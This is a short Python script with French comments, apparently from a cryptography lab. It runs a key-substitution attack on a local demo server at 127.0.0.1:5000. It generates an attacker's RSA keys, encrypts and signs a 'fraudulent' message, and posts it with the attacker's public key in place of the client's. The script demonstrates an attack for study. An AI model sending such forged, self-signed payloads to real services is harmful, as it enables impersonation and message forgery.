import requests         # Pour envoyer les requêtes HTTP au serveur
import rsa              # Pour générer les clés, signer et chiffrer en RSA
import base64           # Pour encoder les données binaires (message, signature) en base64

# ---------------------------
# L'attaquant génère sa propre paire de clés RSA
# ---------------------------
print("Génération des clés RSA de l'attaquant...")
fake_pubkey, fake_privkey = rsa.newkeys(2048)
print("Clés de l'attaquant générées.")

# ---------------------------
# Message frauduleux que l'attaquant veut envoyer
# ---------------------------
message = "Ceci est un message frauduleux envoyé par Tristan.".encode('utf-8')
print(f"Message frauduleux préparé : {message.decode()}")

# ---------------------------
# Récupération de la clé publique du serveur
# ---------------------------
print("Récupération de la clé publique du serveur...")
response = requests.get("http://127.0.0.1:5000/get_key")

try:
    server_pubkey_pem = response.json()["key"]
    print("Clé publique du serveur récupérée.")
except Exception:
    print("Erreur lors de la récupération de la clé publique du serveur.")
    print("Contenu brut :", response.text)
    exit(1)

# Reconstruction de la clé publique du serveur
server_pubkey = rsa.PublicKey.load_pkcs1(server_pubkey_pem.encode())
print("Clé publique du serveur reconstruite.")

# ---------------------------
# Chiffrement du message frauduleux avec la clé publique du serveur
# ---------------------------
message_chiffre = rsa.encrypt(message, server_pubkey)
print("Message frauduleux chiffré.")

# ---------------------------
# Signature du message clair avec la clé privée de l'attaquant
# ---------------------------
signature = rsa.sign(message, fake_privkey, 'SHA-256')
print("Signature frauduleuse générée avec la clé de l'attaquant.")

# ---------------------------
# Construction du faux payload contenant :
# - un message frauduleux,
# - une signature valide (mais d’un Hacker (Tristan)),
# - la fausse clé publique du client (celle de l’attaquant)
# ---------------------------
payload = {
    "message": base64.b64encode(message_chiffre).decode(),
    "signature": base64.b64encode(signature).decode(),
    "client_pubkey": fake_pubkey.save_pkcs1().decode()
}
print("Payload frauduleux prêt à être envoyé.")

# ---------------------------
# Envoi de la requête POST falsifiée au serveur
# ---------------------------
print("Envoi du message frauduleux au serveur...")
response = requests.post("http://127.0.0.1:5000/message", json=payload)

# ---------------------------
# Affichage de la réponse du serveur
# ---------------------------
try:
    print("Réponse du serveur :", response.json())
except Exception:
    print("Erreur brute :", response.status_code, response.text)
